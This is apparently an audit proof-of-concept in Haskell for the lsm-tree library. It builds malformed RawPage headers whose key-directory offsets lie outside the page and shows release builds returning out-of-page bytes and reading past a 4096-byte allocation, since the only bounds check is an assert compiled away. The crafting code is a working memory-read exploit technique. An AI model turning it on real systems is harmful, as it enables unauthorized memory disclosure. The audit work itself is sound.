-- | PoC: RawPage trusts page-header offsets; the only bounds check is a
-- Haskell @assert@ that @-O@ compiles away.
--
-- Target : IntersectMBO/lsm-tree @ 63a63054 (audited 2026-11-17)
--
-- Facts established by this program (see the three run modes in CI):
--
--  * Release build (cabal.project.release): a page whose header puts the key
--    directory outside the 4096-byte page returns keys whose bytes live
--    outside the page -- silently, no exception.
--
--  * Release build + -fno-ignore-asserts: the SAME input aborts with
--    "Assertion failed" at src-core/Database/LSMTree/Internal/Vector.hs:40
--    (mkPrimVector's isValidSlice check). So the guard exists; it is simply
--    compiled out of the production configuration.
--
-- Read path: RunReader.hs:313-325 readDiskPage allocates EXACTLY 4096 bytes
-- (newPinnedByteArray pageSize), so any header offset > 4096 is an
-- out-of-bounds read past the end of that allocation.
module Main (main) where

import           Control.Exception (SomeException, evaluate, try)
import           Data.Bits (shiftR, (.&.))
import           Data.List (foldl', isPrefixOf)
import           Data.Primitive.ByteArray
import qualified Data.Vector as V
import           Data.Word (Word16, Word8)
import           Database.LSMTree.Internal.BlobRef (BlobSpan)
import           Database.LSMTree.Internal.Entry (Entry)
import qualified Database.LSMTree.Internal.RawBytes as RB
import           Database.LSMTree.Internal.RawPage
import           Database.LSMTree.Internal.Serialise (SerialisedKey (..),
                     SerialisedValue)
import           System.Exit (exitFailure)

pageSize :: Int
pageSize = 4096

w16 :: Word16 -> [Word8]
w16 w = [fromIntegral (w .&. 0xFF), fromIntegral (w `shiftR` 8)]

buildPinned :: Int -> [(Int, [Word8])] -> IO ByteArray
buildPinned n patches = do
    let bytes = foldl' apply (replicate n 0) patches
        apply acc (off, ws) = take off acc ++ ws ++ drop (off + length ws) acc
    mba <- newPinnedByteArray n
    copyByteArray mba 0 (byteArrayFromList bytes) 0 n
    unsafeFreezeByteArray mba

-- | Payload that lives at byte 5000 -- i.e. OUTSIDE the 4096-byte page region.
sentinel :: [Word8]
sentinel = map (fromIntegral . fromEnum) "LEAK-OUTSIDE-THE-PAGE"

-- | Page header says: 2 keys, key directory at byte 4096, key 0 = bytes
-- 5000..5004, key 1 = empty. Bytes 5000..5004 hold the sentinel prefix.
craftedPage :: IO RawPage
craftedPage = do
    ba <- buildPinned (2 * pageSize)
            [ (0,    w16 2)                        -- numKeys
            , (2,    w16 0)                        -- numBlobs
            , (4,    w16 (fromIntegral pageSize))  -- keysOffset -> byte 4096
            , (4096, w16 5000 ++ w16 5005 ++ w16 5005)
            , (5000, sentinel)
            ]
    pure (unsafeMakeRawPage ba 0)

renderKey :: SerialisedKey -> String
renderKey (SerialisedKey rb) = show (RB.unpack rb)

-- | A returned key is a leak if its bytes are a non-empty prefix of the
-- sentinel, which only exists outside the page.
isLeak :: SerialisedKey -> Bool
isLeak (SerialisedKey rb) = let b = RB.unpack rb in not (null b) && b `isPrefixOf` sentinel

-- | Variant 1: rawPageKeys (bulk accessor).
variantKeys :: IO Bool
variantKeys = do
    page <- craftedPage
    let keys = V.toList (rawPageKeys page)
        leaked = any isLeak keys
    putStrLn $ "  rawPageNumKeys         = " ++ show (rawPageNumKeys page)
    putStrLn $ "  rawPageKeys            = " ++ show (map renderKey keys)
    putStrLn $ "  bytes 76,69,65,75,45   = \"LEAK-\" -- live at byte 5000, outside the page"
    putStrLn $ "  leaked outside page?   = " ++ show leaked
    putStrLn $ if leaked
      then "  RESULT: FAIL-OPEN -- out-of-page bytes returned as keys"
      else "  RESULT: bounded"
    pure leaked

-- | Variant 2: rawPageIndex -- the exact call RunReader.next makes
-- (RunReader.hs:265) while walking a run file read from disk.
variantProductionPath :: IO Bool
variantProductionPath = do
    page <- craftedPage
    r <- try (evaluate (rawPageIndex page 0 :: RawPageIndex (Entry SerialisedValue BlobSpan)))
    case r of
      Left e -> do
        putStrLn $ "  exception              = " ++ show e
        putStrLn "  RESULT: bounded (guard fired)"
        pure False
      Right (IndexEntry k _) -> do
        let leaked = isLeak k
        putStrLn $ "  rawPageIndex page 0    = IndexEntry, key = " ++ renderKey k
        putStrLn $ "  leaked outside page?   = " ++ show leaked
        putStrLn $ if leaked
          then "  RESULT: FAIL-OPEN -- production read path returns out-of-page bytes"
          else "  RESULT: bounded"
        pure leaked
      Right _ -> do
        putStrLn "  rawPageIndex page 0    = not an IndexEntry (unexpected)"
        pure False

-- | Variant 3: production shape -- the array is exactly 4096 bytes (as
-- readDiskPage allocates), header points at byte 65520.
variantPastEndOfAllocation :: IO Bool
variantPastEndOfAllocation = do
    ba <- buildPinned pageSize
            [ (0, w16 2)
            , (2, w16 0)
            , (4, w16 0xFFF0)   -- key directory "at byte 65520" in a 4096-byte page
            ]
    let page = unsafeMakeRawPage ba 0
    r <- try (evaluate (V.length (rawPageKeys page))) :: IO (Either SomeException Int)
    putStrLn $ "  sizeofByteArray        = " ++ show (sizeofByteArray ba)
    putStrLn $ "  keysOffset (header)    = 0xFFF0 = 65520 bytes"
    case r of
      Left e -> do
        putStrLn $ "  exception              = " ++ show e
        putStrLn "  RESULT: bounded (guard fired)"
        pure False
      Right n -> do
        putStrLn $ "  rawPageKeys            = returned " ++ show n ++ " keys, NO exception"
        putStrLn "  RESULT: FAIL-OPEN -- read ~61 KB past the end of a 4096-byte allocation"
        pure True

main :: IO ()
main = do
    putStrLn "=== lsm-tree RawPage offset validation PoC ==="
    putStrLn ""
    putStrLn "[1] rawPageKeys, key directory outside the page region"
    a <- variantKeys
    putStrLn ""
    putStrLn "[2] rawPageIndex -- exact call RunReader.next makes (RunReader.hs:265)"
    b <- variantProductionPath
    putStrLn ""
    putStrLn "[3] page = exactly 4096 B (readDiskPage shape), keysOffset = 65520"
    c <- variantPastEndOfAllocation
    putStrLn ""
    putStrLn "---------------------------------------------"
    putStrLn $ "leaks: [1]=" ++ show a ++ " [2]=" ++ show b ++ " [3]=" ++ show c
    if a || b || c
      then do
        putStrLn "VERDICT: FAIL-OPEN -- page header offsets are trusted without validation"
        exitFailure
      else putStrLn "VERDICT: all variants bounded"
